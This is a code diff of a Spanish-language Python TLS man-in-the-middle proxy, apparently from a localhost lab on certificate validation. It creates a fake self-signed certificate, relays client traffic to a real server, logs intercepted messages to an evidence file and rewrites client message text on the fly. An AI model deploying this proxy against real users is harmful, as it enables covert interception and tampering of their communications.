@@ -3,34 +3,41 @@ import ssl
 import threading
 import subprocess
 import os
+import logging
 
-# -----------------------------
-# CONFIGURACIÓN DEL ATACANTE
-# -----------------------------
+BASE_DIR  = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+MITM_CERT = os.path.join(BASE_DIR, "mitm_cert.pem")
+MITM_KEY  = os.path.join(BASE_DIR, "mitm_key.pem")
+LOG_FILE  = os.path.join(BASE_DIR, "evidencias", "evidencias_mitm.log")
+
+os.makedirs(os.path.join(BASE_DIR, "evidencias"), exist_ok=True)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s | %(message)s',
+    datefmt='%Y-%m-%dT%H:%M:%S',
+    handlers=[
+        logging.FileHandler(LOG_FILE, encoding='utf-8'),
+        logging.StreamHandler()
+    ]
+)
+
 PUERTO_FALSO = 3444   # El cliente se conecta aquí (engañado)
 HOST_REAL    = "127.0.0.1"
 PUERTO_REAL  = 3443   # Servidor legítimo
 
-MITM_CERT = "mitm_cert.pem"
-MITM_KEY  = "mitm_key.pem"
 
-# -----------------------------
-# GENERACIÓN DEL CERTIFICADO MITM
-# -----------------------------
 def generar_cert_mitm():
     if not os.path.exists(MITM_CERT) or not os.path.exists(MITM_KEY):
-        print("[*] Generando certificado MitM falso...")
+        logging.info("Generando certificado MitM falso...")
         subprocess.run([
             "openssl", "req", "-x509", "-newkey", "rsa:2048",
             "-keyout", MITM_KEY, "-out", MITM_CERT,
             "-days", "365", "-nodes",
             "-subj", "/CN=localhost-mitm"
         ], check=True)
-        print("[*] Certificado MitM generado.")
+        logging.info("Certificado MitM generado.")
 
-# -----------------------------
-# REENVÍO E INTERCEPTACIÓN
-# -----------------------------
+
 def reenviar_datos(origen, destino, direccion):
     while True:
         try:
@@ -41,27 +48,26 @@ def reenviar_datos(origen, destino, direccion):
             mensaje = datos.decode('utf-8', errors='ignore')
 
             if direccion == "CLIENTE -> SERVIDOR":
-                print(f"\n[+] Interceptado ({direccion}): {mensaje}")
+                logging.info(f"Interceptado ({direccion}): {mensaje}")
 
-                # ======================================================
-                # ZONA DE ATAQUE: MAN-IN-THE-MIDDLE
-                # Modificamos el texto del mensaje al vuelo
-                # ======================================================
+                # Manipulamos el texto del mensaje al vuelo (MitM activo)
                 if mensaje.startswith("MENSAJE:"):
                     partes = mensaje.split(":", 2)  # MENSAJE:token:texto
                     if len(partes) == 3:
+                        original = partes[2]
                         partes[2] = "MENSAJE MANIPULADO POR EL ATACANTE"
                         datos = ":".join(partes).encode()
-                        print(f"[!] Mensaje modificado: {datos.decode()}")
+                        logging.warning(f"MENSAJE MODIFICADO | Original: '{original}' → Inyectado: '{partes[2]}'")
 
             else:
-                print(f"\n[-] Interceptado ({direccion}): {mensaje}")
+                logging.info(f"Interceptado ({direccion}): {mensaje}")
 
             destino.sendall(datos)
 
         except Exception:
-            print(f"[x] Conexión cerrada en {direccion}")
+            logging.info(f"Conexión cerrada en {direccion}")
             break
+
 
 def manejar_conexion(cliente_ssl):
     # Conectar al servidor real con SSL (sin verificar su certificado)
@@ -74,16 +80,14 @@ def manejar_conexion(cliente_ssl):
         servidor_ssl = ctx_salida.wrap_socket(raw, server_hostname=HOST_REAL)
         servidor_ssl.connect((HOST_REAL, PUERTO_REAL))
     except Exception:
-        print("[x] No se pudo conectar al servidor real.")
+        logging.error("No se pudo conectar al servidor real.")
         cliente_ssl.close()
         return
 
     threading.Thread(target=reenviar_datos, args=(cliente_ssl, servidor_ssl, "CLIENTE -> SERVIDOR"), daemon=True).start()
     threading.Thread(target=reenviar_datos, args=(servidor_ssl, cliente_ssl, "SERVIDOR -> CLIENTE"), daemon=True).start()
 
-# -----------------------------
-# INICIO DEL PROXY
-# -----------------------------
+
 def iniciar_proxy():
     generar_cert_mitm()
 
@@ -96,20 +100,20 @@ def iniciar_proxy():
         proxy.bind(("127.0.0.1", PUERTO_FALSO))
         proxy.listen(5)
         proxy.settimeout(1.0)
-        print(f"[*] PROXY MitM SSL escuchando en el puerto {PUERTO_FALSO}")
-        print(f"[*] Redirigiendo al servidor real en {PUERTO_REAL}")
-        print(f"[*] El ataque funciona porque el cliente tiene CERT_NONE (no verifica certificado)")
+        logging.info(f"PROXY MitM SSL escuchando en el puerto {PUERTO_FALSO}")
+        logging.info(f"Redirigiendo al servidor real en {PUERTO_REAL}")
+        logging.info("El ataque funciona porque el cliente tiene CERT_NONE (no verifica certificado)")
 
         while True:
             try:
                 conn, addr = proxy.accept()
                 ssl_conn = ctx_entrada.wrap_socket(conn, server_side=True)
-                print(f"\n[*] Victima conectada desde {addr}")
+                logging.warning(f"Victima conectada desde {addr}")
                 threading.Thread(target=manejar_conexion, args=(ssl_conn,), daemon=True).start()
             except socket.timeout:
                 pass
             except KeyboardInterrupt:
-                print("\n[!] Proxy apagado.")
+                logging.info("Proxy apagado.")
                 break
 
 if __name__ == "__main__":
